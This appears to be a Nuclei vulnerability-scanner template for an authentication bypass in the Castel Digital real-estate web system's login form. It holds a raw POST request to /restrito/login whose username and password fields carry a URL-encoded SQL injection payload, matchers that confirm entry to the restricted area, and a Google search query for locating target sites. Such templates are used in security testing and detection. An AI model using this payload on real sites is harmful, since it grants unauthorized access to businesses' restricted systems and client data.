id: castel-digital-sqli

info:
  name: Castel Digital Authentication Bypass
  author: Kazgangap
  severity: high
  description: SQL Injection vulnerability in Castel Digital login forms.
  reference:
    - https://www.casteldigital.com.br/
    - https://cxsecurity.com/issue/WLB-2024050032
  metadata:
    google-query: "Castel Digital"
  tags: sqli,webapps


http:
  - raw:
      - |
        POST /restrito/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=x%27%3D%27x%27or%27x&password=x%27%3D%27x%27or%27x

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Sistema Web para Imobiliárias e Corretores"
          - "Área Restrita"
        condition: and
      - type: status
        status:
          - 200